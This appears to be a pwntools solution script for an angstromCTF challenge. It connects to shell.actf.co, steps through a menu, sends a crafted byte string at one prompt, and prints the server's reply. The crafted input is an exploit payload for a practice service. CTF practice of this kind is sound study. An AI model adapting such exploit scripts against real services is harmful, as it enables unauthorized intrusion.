from pwn import *

pty = process.PTY

def readlines(p, n):
    for i in range(n):
        print(p.readline())

p = remote('shell.actf.co', 21300)

p.recvline(5)
p.sendline('1')
p.recvuntil("conditions? ")
p.send('123\x39\x39\x05')
p.sendline()
p.recvuntil("conditions? ")
p.sendline("yes")
p.recvuntil("here: ")
p.sendline("123")
p.recvuntil("name:")
p.sendline("123")
p.recvuntil("do? ")
p.sendline("2")
readlines(p, 1)
p.close()